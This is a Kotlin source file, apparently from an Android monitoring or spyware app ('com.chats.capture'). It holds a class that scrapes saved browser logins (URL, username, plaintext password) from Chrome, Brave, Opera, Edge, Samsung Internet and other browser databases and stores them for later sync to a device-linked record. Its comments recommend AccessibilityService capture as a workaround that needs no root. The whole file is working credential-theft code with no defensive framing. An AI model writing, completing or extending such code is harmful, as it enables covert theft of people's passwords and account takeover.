package com.chats.capture.utils

import android.content.Context
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.os.Build
import com.chats.capture.CaptureApplication
import com.chats.capture.database.CredentialDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.Credential
import com.chats.capture.models.CredentialType
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.io.File

/**
 * Fetches saved credentials from browser databases
 * Supports Chrome, Firefox, Edge, Samsung Internet, and other browsers
 */
class BrowserCredentialFetcher(private val context: Context) {
    
    private val credentialDao: CredentialDao = (context.applicationContext as CaptureApplication).database.credentialDao()
    private val deviceRegistrationManager = DeviceRegistrationManager(context)
    
    /**
     * Fetch all saved credentials from browser databases
     */
    suspend fun fetchBrowserCredentials(): List<Credential> = withContext(Dispatchers.IO) {
        val credentials = mutableListOf<Credential>()
        
        try {
            // Fetch from Chrome/Chromium-based browsers
            credentials.addAll(fetchChromeCredentials())
            
            // Fetch from Firefox
            credentials.addAll(fetchFirefoxCredentials())
            
            // Fetch from Samsung Internet
            credentials.addAll(fetchSamsungInternetCredentials())
            
            // Fetch from Edge
            credentials.addAll(fetchEdgeCredentials())
            
            Timber.tag("BROWSER_CREDENTIALS").i("✅ Fetched ${credentials.size} credentials from browsers")
        } catch (e: Exception) {
            Timber.tag("BROWSER_CREDENTIALS").e(e, "Error fetching browser credentials")
        }
        
        credentials
    }
    
    /**
     * Fetch credentials from Chrome/Chromium-based browsers
     */
    private suspend fun fetchChromeCredentials(): List<Credential> {
        val credentials = mutableListOf<Credential>()
        
        try {
            // Chrome database paths
            val chromePaths = listOf(
                "/data/data/com.android.chrome/databases/Login Data",
                "/data/data/com.chrome.browser/databases/Login Data",
                "/data/data/com.chrome.dev/databases/Login Data",
                "/data/data/com.chrome.canary/databases/Login Data",
                "/data/data/com.google.android.apps.chrome/databases/Login Data",
                "/data/data/com.brave.browser/databases/Login Data",
                "/data/data/com.opera.browser/databases/Login Data",
                "/data/data/com.vivaldi.browser/databases/Login Data",
                "/data/data/com.uc.browser.en/databases/Login Data"
            )
            
            chromePaths.forEach { dbPath ->
                try {
                    val dbFile = File(dbPath)
                    if (dbFile.exists() && dbFile.canRead()) {
                        val chromeCreds = readChromeDatabase(dbPath)
                        credentials.addAll(chromeCreds)
                        Timber.tag("BROWSER_CREDENTIALS").d("Fetched ${chromeCreds.size} credentials from ${dbPath}")
                    }
                } catch (e: Exception) {
                    Timber.v("Cannot access Chrome database: $dbPath - ${e.message}")
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error fetching Chrome credentials")
        }
        
        return credentials
    }
    
    /**
     * Read credentials from Chrome database
     * 
     * ⚠️ IMPORTANT: Browser credential databases are protected and may require:
     * - Root access for direct database reading
     * - Chrome database may be encrypted (OS-level encryption)
     * - Alternative: Real-time capture via AccessibilityService works without root
     */
    private fun readChromeDatabase(dbPath: String): List<Credential> {
        val credentials = mutableListOf<Credential>()
        
        try {
            // Note: This will likely fail without root access or special permissions
            // Chrome databases are protected by Android's security model
            // Real-time capture via AccessibilityService is the recommended approach
            val db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY)
            
            val cursor: Cursor = db.query(
                "logins",
                arrayOf("origin_url", "username_value", "password_value", "date_created", "date_last_used"),
                null,
                null,
                null,
                null,
                "date_last_used DESC"
            )
            
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            while (cursor.moveToNext()) {
                try {
                    val url = cursor.getString(cursor.getColumnIndexOrThrow("origin_url")) ?: ""
                    val username = cursor.getString(cursor.getColumnIndexOrThrow("username_value")) ?: ""
                    val password = cursor.getString(cursor.getColumnIndexOrThrow("password_value")) ?: ""
                    
                    if (password.isNotBlank() && (username.isNotBlank() || url.isNotBlank())) {
                        val domain = extractDomain(url)
                        val email = if (username.contains("@")) username else null
                        
                        val credential = Credential(
                            deviceId = deviceId,
                            accountType = CredentialType.BROWSER_LOGIN,
                            appPackage = "chrome",
                            appName = "Chrome",
                            email = email,
                            username = if (email == null) username else null,
                            password = password,
                            domain = domain,
                            url = url,
                            devicePassword = false,
                            timestamp = System.currentTimeMillis(),
                            synced = false
                        )
                        
                        credentials.add(credential)
                    }
                } catch (e: Exception) {
                    Timber.v("Error reading credential row: ${e.message}")
                }
            }
            
            cursor.close()
            db.close()
        } catch (e: Exception) {
            Timber.v("Cannot read Chrome database (may require root): $dbPath - ${e.message}")
        }
        
        return credentials
    }
    
    /**
     * Fetch credentials from Firefox
     */
    private suspend fun fetchFirefoxCredentials(): List<Credential> {
        val credentials = mutableListOf<Credential>()
        
        try {
            val firefoxPaths = listOf(
                "/data/data/org.mozilla.firefox/files/mozilla/profile.default/logins.json",
                "/data/data/com.mozilla.firefox/files/mozilla/profile.default/logins.json"
            )
            
            firefoxPaths.forEach { jsonPath ->
                try {
                    val jsonFile = File(jsonPath)
                    if (jsonFile.exists() && jsonFile.canRead()) {
                        // Firefox stores credentials in encrypted JSON
                        // This is complex to decrypt without Firefox's key
                        Timber.v("Firefox credentials found but encrypted: $jsonPath")
                    }
                } catch (e: Exception) {
                    Timber.v("Cannot access Firefox credentials: $jsonPath")
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error fetching Firefox credentials")
        }
        
        return credentials
    }
    
    /**
     * Fetch credentials from Samsung Internet
     */
    private suspend fun fetchSamsungInternetCredentials(): List<Credential> {
        val credentials = mutableListOf<Credential>()
        
        try {
            val samsungPath = "/data/data/com.samsung.android.sbrowser/databases/Login Data"
            val dbFile = File(samsungPath)
            
            if (dbFile.exists() && dbFile.canRead()) {
                val samsungCreds = readChromeDatabase(samsungPath) // Uses same format as Chrome
                credentials.addAll(samsungCreds)
            }
        } catch (e: Exception) {
            Timber.v("Cannot access Samsung Internet credentials")
        }
        
        return credentials
    }
    
    /**
     * Fetch credentials from Edge
     */
    private suspend fun fetchEdgeCredentials(): List<Credential> {
        val credentials = mutableListOf<Credential>()
        
        try {
            val edgePath = "/data/data/com.microsoft.emmx/databases/Login Data"
            val dbFile = File(edgePath)
            
            if (dbFile.exists() && dbFile.canRead()) {
                val edgeCreds = readChromeDatabase(edgePath) // Uses same format as Chrome
                credentials.addAll(edgeCreds)
            }
        } catch (e: Exception) {
            Timber.v("Cannot access Edge credentials")
        }
        
        return credentials
    }
    
    /**
     * Extract domain from URL
     */
    private fun extractDomain(url: String): String? {
        return try {
            if (url.startsWith("http://") || url.startsWith("https://")) {
                val domain = url.substringAfter("://").substringBefore("/")
                domain.substringBefore(":")
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Save fetched credentials to database
     */
    suspend fun saveBrowserCredentials(credentials: List<Credential>) = withContext(Dispatchers.IO) {
        try {
            credentials.forEach { credential ->
                try {
                    // Check for duplicate
                    val duplicate = credentialDao.findDuplicateCredential(
                        credential.appPackage,
                        credential.username ?: credential.email,
                        credential.password
                    )
                    
                    if (duplicate == null) {
                        credentialDao.insertCredential(credential)
                        Timber.tag("BROWSER_CREDENTIALS").d("Saved browser credential: ${credential.domain} - ${credential.username ?: credential.email}")
                    } else {
                        Timber.v("Duplicate browser credential skipped: ${credential.domain}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error saving browser credential")
                }
            }
            
            Timber.tag("BROWSER_CREDENTIALS").i("✅ Saved ${credentials.size} browser credentials to database")
        } catch (e: Exception) {
            Timber.e(e, "Error saving browser credentials")
        }
    }
}
